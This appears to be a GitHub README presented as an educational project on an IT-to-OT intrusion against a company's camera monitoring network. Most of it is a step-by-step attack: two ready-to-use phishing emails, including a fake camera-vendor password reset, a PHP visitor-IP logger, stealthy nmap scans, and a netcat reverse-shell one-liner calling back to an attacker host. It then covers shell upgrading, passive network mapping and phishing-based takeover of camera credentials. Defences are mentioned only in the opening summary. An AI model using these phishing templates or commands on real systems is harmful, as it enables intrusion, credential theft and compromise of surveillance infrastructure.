Offense Meets Defense: OT Cybersecurity Strategies vs IT Adversary-in-the-Loop

All name and number is Fake just to explain how that happened , I am not responsible for any illegal or unethical use of the information contained within it.


⚖️ This document is for educational purposes only. The author is not responsible for any illegal or unethical misuse of the information provided , I am not responsible for any illegal or unethical use of the information contained within it.

Description:

This project demonstrates how an IT based adversary may attempt to infiltrate an Operational Technology (OT) environment and how cybersecurity controls can defend against it. The scenario begins with information gathering and OSINT, where an attacker collects publicly exposed company data and targets employees through phishing — illustrating the importance of email security awareness. Once an attacker gains initial access, they could map network assets and identify vulnerable IoT or camera monitoring systems using passive reconnaissance. OT devices often run BusyBox based firmware, making them high risk when unpatched. Defensively, the project emphasizes network segmentation, VLAN hardening, logging, intrusion detection, and staff awareness training. The final objective is to show how combining offensive simulation and defensive strategies strengthens OT security.
________________________________________
In the first thing, we need information gathering about the target:

First, need the <IP> of the victim to scan and see all ports that are open to attack the port to have access in the network. Need to do a phishing email:

Subject: Discover How Solution_code Can Transform Your Business – Free 30 Min Consultation

Dear [Client's Name],
I hope this message finds you well.
My name is [Your Name], and I represent Solution_Code, a company dedicated to delivering cutting edge technology solutions, software, and tools designed to enhance efficiency, streamline operations, and drive business growth.
At Solution_Code, we offer a wide range of services, multiple packages, and diverse content, all tailored to meet the unique needs of businesses like yours.
To explore our solutions and discover which packages suit your business best, feel free to visit our website: [https://SolxxxxxxDev.com]
We would like to invite you to a free 30 minute consultation, where we will:

• Demonstrate how our solutions and software can simplify your daily operations.
• Explore innovative ways to increase productivity and reduce costs.
• Guide you through the variety of packages and services we offer.
• Provide a tailored experience, showing firsthand the value our tools can bring to your organization.
Special Offer: Register for the consultation now and receive 30% off on all packages and solutions!
Visit the link to see all packages’ solutions:
[https://SolxxxxxxDev.com/offers.php]
We understand that every business is unique, which is why this session is fully customized to your requirements.
To schedule your consultation at a convenient time, please click here [https://SolxxxxxxDev.com/consultation.php] or simply reply to this email.
We look forward to the opportunity to partner with you and help take your business to the next level.
Warm regards,

[Your Name]
[Your Position]
Solution_Code

[0000000000] | [Solxxxxxx@gmail.com] | [https://[SolxxxxxxDev.com]

Pic of Website phishing Website :

<img width="1899" height="996" alt="rev_web" src="https://github.com/user-attachments/assets/0fd7d0f4-5942-4891-a8bd-46d4c35d8232" />

<img width="1904" height="923" alt="Offers" src="https://github.com/user-attachments/assets/aada826c-8638-41f8-9dae-dbeb92fb131c" />


<img width="1894" height="990" alt="2_web" src="https://github.com/user-attachments/assets/e02c33fb-ca3a-475f-8794-c2ad254fccf5" />

________________________________________
Now, waiting for the click and booking a free session in the website. A PHP code is used PHP trick (PHP gets the visitor's IP address and saves all IPs in a file called visitors.txt). After one click on the website, it returns the victim <IP> because the website runs on (Apache HTTP Server).
The code file name in web (log.php): The trick:

<img width="475" height="96" alt="image" src="https://github.com/user-attachments/assets/8b0ce5e0-9978-4946-984b-48669b2cf59f" />


To put this in all pages, a new file in the project is made called (header.php)


It has inside:

<img width="250" height="26" alt="image" src="https://github.com/user-attachments/assets/f7357c40-32c2-4f59-8327-12f387e86733" />

To put this at the top of all pages to guarantee that if the victim enters any page, his IP address will be recorded.

after click in web genrat file visitors.txt :


<img width="141" height="149" alt="vistior_ip" src="https://github.com/user-attachments/assets/df40c948-2782-4056-9711-d5f2fe4d4f8e" />

________________________________________
Now I have <IP> of the victim, that means I have the first step in the company to have access in camera monitor. Need to use a scanner:

First after Know IP address need Imagine The Network of company :

<img width="1552" height="657" alt="imagin_net" src="https://github.com/user-attachments/assets/a4f2313b-6ff1-48c9-89d7-955af91ca830" />


nmap -Pn -f -T1 -p 21,22,80,8080 <IP>

<img width="356" height="42" alt="nmap" src="https://github.com/user-attachments/assets/06082f29-6608-43e6-a12e-722b3a2fd494" />

Now I have port 80 open.

Let's open <IP>:80, a website works. Let's try to write a reverse shell in input in website to have access because the project is in the victim device.
Reverse shell:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> 2299>/tmp/f

On Kali terminal write:
nc -lnvp 2299

<img width="420" height="84" alt="nc" src="https://github.com/user-attachments/assets/d6602b2a-efa0-459f-af9f-db80224d7cd9" />


It works. Now I have reverse shell in the victim employee in company — second step is done.
________________________________________

After opening a channel between hacker and victim, let's take more privilege in her network and devices:

Write the script in terminal:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Now need to check if victim uses what OS (Kali or Windows).

Why? Because I need all IP in company with fewer tools because I don't want my fingerprint on the network. Passive mode is very important.
Terminal command:
1-

arp -a (if it works that means the victim used Windows OS)

arp -a shows a list of IP addresses on your local network and their associated MAC addresses plus which interface sees them. It helps 
identify which devices exist on the LAN and who is active. A hacker could use this information to map targets if they already have access to the network.
Now have all IP and MAC addresses for company without ping and still no one knows there's a hacker in Network of company.
2- 

If the OS is Kali:
uname -a (if it works that means victim used Kali OS)
Now first also need passive technique:
First need to know the name of network card:
ip a
Now know the name of network card that works in internal network in company.
Second step:

ping -c1 <IP> 
(This step to make sure all IP in network make ARP and flow to capture them)

netdiscover -p -i eth0

Now have all IP in company, and notes have VLAN in Network.
________________________________________
After having the MAC address for all devices check the trick:

The first 24 bits (6 hex digits) of the MAC address into a website like DNS Checker,
macaddresslookup.io, or ipchecktool.com to find the company that made the network card (e.g., Apple, Samsung, Intel).
Now I have name of camera in VLAN 5 and have server only for monitor and camera record.

Let's map the IP of VLAN 5:

nmap -f -Pn x.x.5.0/24 (To know all IP given for camera and the record server)
________________________________________
In OT things need to know hardware control and hack camera device because have (BusyBox).

BusyBox is a lightweight Linux toolkit commonly embedded in IoT and OT devices like IP cameras. It provides command line utilities that, if exposed or configured poorly, can allow attackers to run system commands. Weak credentials or open shells (e.g., telnet/SSH) on BusyBox based cameras can lead to full device compromise.
All cameras use ports like (SSH TCP 22, RTSP over TLS RTSPS – TCP 322/443 or SRTP for encrypted video stream transmission, ONVIF)

At this time need use social engineering again because in company there is a significant lack of awareness regarding security and hacking.

Make some OSINT about camera manufacturer to know design, reset the password, to make phishing email to send for employee who works in camera monitor center.

How to know details from IP in VLAN to know email of employee?

dig -x IP

New technique used:
If a box gives you an internal IP and reverse DNS returns example pc.corp.local, that’s usually a hint to guess usernames for login or email format, e.g., <name>@corp.local.

Send him email:

Subject: Important Security Notice – Please Update Your Password

Dear [Client's Name],
We hope this message finds you well.
At CT Camera Company, your account security is our top priority. To ensure the safety of your information, we are reminding all our valued clients to update their login password for enhanced account protection.
Please click the link below to securely reset your password:
[https://xxCameraxxxxx/reset password]
Important tips for a strong password:

• Use at least 8 characters including uppercase, lowercase, numbers, and symbols.
• Avoid using easily guessable information (like birthdays or names).
• Do not reuse passwords from other accounts.
For your safety, this link will expire in 24 hours. If you did not request this change or suspect unusual activity in your account, please contact our support team immediately.
Warm regards,
[Your Name]
[Your Position]
CT Camera Company

[0000000000] | [Email] | [https://xxCameraxxxxx]

Pic of Website reset :

<img width="664" height="992" alt="image" src="https://github.com/user-attachments/assets/fa568e90-6d53-4f1f-b737-16c0932637fe" />


After logging in through the phishing based password reset and accessing the internal web interface, the attacker proceeds to the real login page and changes the credentials quickly to avoid raising suspicion or alerting monitoring staff. 

At this stage, elevated access rights are obtained, allowing full visibility over the internal camera monitoring system. This demonstrates how a successful intrusion, combined with credential manipulation and social engineering, can result in high privilege control over OT based surveillance infrastructure.
